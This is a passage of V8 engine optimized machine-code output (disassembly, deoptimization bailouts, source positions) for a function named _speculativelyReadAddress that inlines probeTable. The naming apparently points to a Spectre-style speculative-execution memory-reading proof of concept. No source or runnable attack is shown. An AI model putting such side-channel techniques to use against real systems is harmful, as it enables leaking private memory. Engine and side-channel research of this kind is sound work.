0x1425ddef6eb1   cd1  50             push rax
                  -- <not inlined:579> --
0x1425ddef6eb2   cd2  488b1d56fdffff REX.W movq rbx,[rip+0xfffffd56]
0x1425ddef6eb9   cd9  b801000000     movl rax,0x1
0x1425ddef6ebe   cde  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6ec2   ce2  e8398cf5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B103 start (deferred) --
0x1425ddef6ec7   ce7  48898d70ffffff REX.W movq [rbp-0x90],rcx
0x1425ddef6ece   cee  4c8b5580       REX.W movq r10,[rbp-0x80]
0x1425ddef6ed2   cf2  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6ed9   cf9  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6edd   cfd  4c895580       REX.W movq [rbp-0x80],r10
                  -- B104 start (deferred) --
0x1425ddef6ee1   d01  48b8f180ed2397130000 REX.W movq rax,0x139723ed80f1    ;; object: 0x139723ed80f1 <String[17]: TRAINING_CONSTANT>
0x1425ddef6eeb   d0b  50             push rax
                  -- <not inlined:462> --
0x1425ddef6eec   d0c  488b1d1cfdffff REX.W movq rbx,[rip+0xfffffd1c]
0x1425ddef6ef3   d13  b801000000     movl rax,0x1
0x1425ddef6ef8   d18  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6efc   d1c  e8ff8bf5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B105 start (deferred) --
0x1425ddef6f01   d21  4c8b5580       REX.W movq r10,[rbp-0x80]
0x1425ddef6f05   d25  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6f0c   d2c  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6f10   d30  4c895580       REX.W movq [rbp-0x80],r10
                  -- B106 start (deferred) --
0x1425ddef6f14   d34  48b8c180ed2397130000 REX.W movq rax,0x139723ed80c1    ;; object: 0x139723ed80c1 <String[23]: speculative_repetitions>
0x1425ddef6f1e   d3e  50             push rax
                  -- <not inlined:436> --
0x1425ddef6f1f   d3f  488b1de9fcffff REX.W movq rbx,[rip+0xfffffce9]
0x1425ddef6f26   d46  b801000000     movl rax,0x1
0x1425ddef6f2b   d4b  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6f2f   d4f  e8cc8bf5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- Out of line code --
0x1425ddef6f34   d54  4883ec08       REX.W subq rsp,0x8
0x1425ddef6f38   d58  c5fb110424     vmovsd [rsp],xmm0
0x1425ddef6f3d   d5d  e85ec0f5ff     call 0x1425dde52fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x1425ddef6f42   d62  448b0c24       movl r9,[rsp]
0x1425ddef6f46   d66  4883c408       REX.W addq rsp,0x8
0x1425ddef6f4a   d6a  e92bf7ffff     jmp 0x1425ddef667a  <+0x49a>
0x1425ddef6f4f   d6f  4883ec08       REX.W subq rsp,0x8
0x1425ddef6f53   d73  c5fb110424     vmovsd [rsp],xmm0
0x1425ddef6f58   d78  e843c0f5ff     call 0x1425dde52fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x1425ddef6f5d   d7d  8b3c24         movl rdi,[rsp]
0x1425ddef6f60   d80  4883c408       REX.W addq rsp,0x8
0x1425ddef6f64   d84  e9d6f3ffff     jmp 0x1425ddef633f  <+0x15f>
0x1425ddef6f69   d89  90             nop
0x1425ddef6f6a   d8a  e8d1d00000     call 0x1425ddf04040     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 0
                                                             ;; eager deoptimization bailout 0
0x1425ddef6f6f   d8f  e8d1d00000     call 0x1425ddf04045     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 1
                                                             ;; eager deoptimization bailout 1
0x1425ddef6f74   d94  e8d1d00000     call 0x1425ddf0404a     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 2
                                                             ;; eager deoptimization bailout 2
0x1425ddef6f79   d99  e8d1d00000     call 0x1425ddf0404f     ;; debug: deopt position, script offset '434'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 3
                                                             ;; eager deoptimization bailout 3
0x1425ddef6f7e   d9e  e8d1d00000     call 0x1425ddf04054     ;; debug: deopt position, script offset '524'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 4
                                                             ;; eager deoptimization bailout 4
0x1425ddef6f83   da3  e8d1d00000     call 0x1425ddf04059     ;; debug: deopt position, script offset '587'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a heap number'
                                                             ;; debug: deopt index 5
                                                             ;; eager deoptimization bailout 5
0x1425ddef6f88   da8  e8d1d00000     call 0x1425ddf0405e     ;; debug: deopt position, script offset '663'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 6
                                                             ;; eager deoptimization bailout 6
0x1425ddef6f8d   dad  e8d1d00000     call 0x1425ddf04063     ;; debug: deopt position, script offset '663'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 7
                                                             ;; eager deoptimization bailout 7
0x1425ddef6f92   db2  e8d1d00000     call 0x1425ddf04068     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 8
                                                             ;; eager deoptimization bailout 8
0x1425ddef6f97   db7  e8d1d00000     call 0x1425ddf0406d     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 9
                                                             ;; eager deoptimization bailout 9
0x1425ddef6f9c   dbc  e8d1d00800     call 0x1425ddf84072     ;; debug: deopt position, script offset '634'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 10
                                                             ;; lazy deoptimization bailout 10
0x1425ddef6fa1   dc1  e8d1d00000     call 0x1425ddf04077     ;; debug: deopt position, script offset '800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 11
                                                             ;; eager deoptimization bailout 11
0x1425ddef6fa6   dc6  e8d1d00000     call 0x1425ddf0407c     ;; debug: deopt position, script offset '800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 12
                                                             ;; eager deoptimization bailout 12
0x1425ddef6fab   dcb  e8d1d00000     call 0x1425ddf04081     ;; debug: deopt position, script offset '797'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 13
                                                             ;; eager deoptimization bailout 13
0x1425ddef6fb0   dd0  e8d1d00000     call 0x1425ddf04086     ;; debug: deopt position, script offset '797'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 14
                                                             ;; eager deoptimization bailout 14
0x1425ddef6fb5   dd5  e8d1d00000     call 0x1425ddf0408b     ;; debug: deopt position, script offset '797'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 15
                                                             ;; eager deoptimization bailout 15
0x1425ddef6fba   dda  e8d1d00000     call 0x1425ddf04090     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 16
                                                             ;; eager deoptimization bailout 16
0x1425ddef6fbf   ddf  e8d1d00000     call 0x1425ddf04095     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 17
                                                             ;; eager deoptimization bailout 17
0x1425ddef6fc4   de4  e8d1d00000     call 0x1425ddf0409a     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 18
                                                             ;; eager deoptimization bailout 18
0x1425ddef6fc9   de9  e8d1d00000     call 0x1425ddf0409f     ;; debug: deopt position, script offset '1167'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 19
                                                             ;; eager deoptimization bailout 19
0x1425ddef6fce   dee  e8d1d00000     call 0x1425ddf040a4     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 20
                                                             ;; eager deoptimization bailout 20
0x1425ddef6fd3   df3  e8d1d00000     call 0x1425ddf040a9     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 21
                                                             ;; eager deoptimization bailout 21
0x1425ddef6fd8   df8  e8d1d00000     call 0x1425ddf040ae     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 22
                                                             ;; eager deoptimization bailout 22
0x1425ddef6fdd   dfd  e8d1d00000     call 0x1425ddf040b3     ;; debug: deopt position, script offset '1318'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong call target'
                                                             ;; debug: deopt index 23
                                                             ;; eager deoptimization bailout 23
0x1425ddef6fe2   e02  e8d1d00000     call 0x1425ddf040b8     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 24
                                                             ;; eager deoptimization bailout 24
0x1425ddef6fe7   e07  e8d1d00000     call 0x1425ddf040bd     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 25
                                                             ;; eager deoptimization bailout 25
0x1425ddef6fec   e0c  e8d1d00000     call 0x1425ddf040c2     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 26
                                                             ;; eager deoptimization bailout 26
0x1425ddef6ff1   e11  e8d1d00000     call 0x1425ddf040c7     ;; debug: deopt position, script offset '524'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 27
                                                             ;; eager deoptimization bailout 27
0x1425ddef6ff6   e16  e8d1d00000     call 0x1425ddf040cc     ;; debug: deopt position, script offset '587'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a heap number'
                                                             ;; debug: deopt index 28
                                                             ;; eager deoptimization bailout 28
0x1425ddef6ffb   e1b  e8d1d00000     call 0x1425ddf040d1     ;; debug: deopt position, script offset '663'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 29
                                                             ;; eager deoptimization bailout 29
0x1425ddef7000   e20  e8d1d00000     call 0x1425ddf040d6     ;; debug: deopt position, script offset '663'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 30
                                                             ;; eager deoptimization bailout 30
0x1425ddef7005   e25  e8d1d00000     call 0x1425ddf040db     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 31
                                                             ;; eager deoptimization bailout 31
0x1425ddef700a   e2a  e8d1d00000     call 0x1425ddf040e0     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 32
                                                             ;; eager deoptimization bailout 32
0x1425ddef700f   e2f  e8d1d00800     call 0x1425ddf840e5     ;; debug: deopt position, script offset '634'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 33
                                                             ;; lazy deoptimization bailout 33
0x1425ddef7014   e34  e8d1d00000     call 0x1425ddf040ea     ;; debug: deopt position, script offset '800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 34
                                                             ;; eager deoptimization bailout 34
0x1425ddef7019   e39  e8d1d00000     call 0x1425ddf040ef     ;; debug: deopt position, script offset '800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 35
                                                             ;; eager deoptimization bailout 35
0x1425ddef701e   e3e  e8d1d00000     call 0x1425ddf040f4     ;; debug: deopt position, script offset '797'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 36
                                                             ;; eager deoptimization bailout 36
0x1425ddef7023   e43  e8d1d00000     call 0x1425ddf040f9     ;; debug: deopt position, script offset '797'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 37
                                                             ;; eager deoptimization bailout 37
0x1425ddef7028   e48  e8d1d00000     call 0x1425ddf040fe     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 38
                                                             ;; eager deoptimization bailout 38
0x1425ddef702d   e4d  e8d1d00000     call 0x1425ddf04103     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 39
                                                             ;; eager deoptimization bailout 39
0x1425ddef7032   e52  e8d1d00000     call 0x1425ddf04108     ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 40
                                                             ;; eager deoptimization bailout 40
0x1425ddef7037   e57  e8d1d00000     call 0x1425ddf0410d     ;; debug: deopt position, script offset '1167'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 41
                                                             ;; eager deoptimization bailout 41
0x1425ddef703c   e5c  e8d1d00000     call 0x1425ddf04112     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 42
                                                             ;; eager deoptimization bailout 42
0x1425ddef7041   e61  e8d1d00000     call 0x1425ddf04117     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 43
                                                             ;; eager deoptimization bailout 43
0x1425ddef7046   e66  e8d1d00000     call 0x1425ddf0411c     ;; debug: deopt position, script offset '1147'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 44
                                                             ;; eager deoptimization bailout 44
0x1425ddef704b   e6b  e8d1d00000     call 0x1425ddf04121     ;; debug: deopt position, script offset '1318'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong call target'
                                                             ;; debug: deopt index 45
                                                             ;; eager deoptimization bailout 45
0x1425ddef7050   e70  e8d1d00000     call 0x1425ddf04126     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 46
                                                             ;; eager deoptimization bailout 46
0x1425ddef7055   e75  e8d1d00800     call 0x1425ddf8412b     ;; debug: deopt position, script offset '416'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 47
                                                             ;; lazy deoptimization bailout 47
0x1425ddef705a   e7a  e8d1d00000     call 0x1425ddf04130     ;; debug: deopt position, script offset '529'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'division by zero'
                                                             ;; debug: deopt index 48
                                                             ;; eager deoptimization bailout 48
0x1425ddef705f   e7f  e8d1d00000     call 0x1425ddf04135     ;; debug: deopt position, script offset '529'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 49
                                                             ;; eager deoptimization bailout 49
0x1425ddef7064   e84  e8d1d00000     call 0x1425ddf0413a     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 50
                                                             ;; eager deoptimization bailout 50
0x1425ddef7069   e89  e8d1d00000     call 0x1425ddf0413f     ;; debug: deopt position, script offset '460'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 51
                                                             ;; eager deoptimization bailout 51
0x1425ddef706e   e8e  e8d1d00800     call 0x1425ddf84144     ;; debug: deopt position, script offset '416'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 52
                                                             ;; lazy deoptimization bailout 52
0x1425ddef7073   e93  e8d1d00000     call 0x1425ddf04149     ;; debug: deopt position, script offset '529'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'division by zero'
                                                             ;; debug: deopt index 53
                                                             ;; eager deoptimization bailout 53
0x1425ddef7078   e98  e8d1d00000     call 0x1425ddf0414e     ;; debug: deopt position, script offset '529'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 54
                                                             ;; eager deoptimization bailout 54
0x1425ddef707d   e9d  e8d1d00000     call 0x1425ddf04153     ;; debug: deopt position, script offset '668'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 55
                                                             ;; eager deoptimization bailout 55
0x1425ddef7082   ea2  e8d1d00800     call 0x1425ddf84158     ;; debug: deopt position, script offset '1128'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 56
                                                             ;; lazy deoptimization bailout 56
0x1425ddef7087   ea7  e8d1d00800     call 0x1425ddf8415d     ;; debug: deopt position, script offset '867'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 57
                                                             ;; lazy deoptimization bailout 57
0x1425ddef708c   eac  e8d1d00800     call 0x1425ddf84162     ;; debug: deopt position, script offset '802'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 58
                                                             ;; lazy deoptimization bailout 58
0x1425ddef7091   eb1  e8d1d00800     call 0x1425ddf84167     ;; debug: deopt position, script offset '670'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 59
                                                             ;; lazy deoptimization bailout 59
0x1425ddef7096   eb6  e8d1d00800     call 0x1425ddf8416c     ;; debug: deopt position, script offset '650'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 60
                                                             ;; lazy deoptimization bailout 60
0x1425ddef709b   ebb  e8d1d00800     call 0x1425ddf84171     ;; debug: deopt position, script offset '579'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 61
                                                             ;; lazy deoptimization bailout 61
0x1425ddef70a0   ec0  e8d1d00800     call 0x1425ddf84176     ;; debug: deopt position, script offset '462'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 62
                                                             ;; lazy deoptimization bailout 62
0x1425ddef70a5   ec5  e8d1d00800     call 0x1425ddf8417b     ;; debug: deopt position, script offset '436'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 63
                                                             ;; lazy deoptimization bailout 63
0x1425ddef70aa   eca  6690           nop
                  ;;; Safepoint table.

Source positions:
 pc offset  position
         0       293
        28       434
        2c       436
        42       462
        4c       460
        81       434
        a7       416
        b4       524
        c0       529
        c9       524
        cc       529
       117       579
       133       587
       16a       634
       16e       589
       174       587
       177       650
       18f       663
       1ab       670
       1b5       668
       1e0       634
       206       765
       20e       802
       218       800
       238       797
       278       813
       284       867
       292       879
       2c9      1128
       2d7      1151
       2da      1167
       2e3      1147
       2f9      1179
       303      1147
       328      1133
       330      1238
       33d      1318
       370       434
       374       436
       386       462
       397       460
       3ce       434
       3de       416
       3eb       524
       3f7       529
       400       524
       403       529
       451       579
       46d       587
       4a6       634
       4aa       589
       4b0       587
       4b3       650
       4cb       663
       4e7       670
       4f1       668
       51a       634
       540       765
       548       802
       552       800
       572       797
       5a8       813
       5b4       867
       5c2       879
       5fa      1128
       608      1151
       60b      1167
       614      1147
       62a      1179
       634      1147
       659      1133
       661      1238
       66e      1318
       69b      1404
       6a6       460
       6e5       416
       72e       529
       7cf       668
       86c       460
       8b2       416
       8fb       529
       9a3       668
       a26      1128
       a89       867
       ba0       436
       bfc       802
       c4e       670
       c95       650
       cd2       579
       d0c       462
       d3f       436

Inlined functions (count = 1)
 0x139723ed8571 <SharedFunctionInfo probeTable>

Deoptimization Input Data (deopt points = 64)
 index  bytecode-offset    pc  commands
     0               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     1               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     2               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     3               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     4               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     5               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     6               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
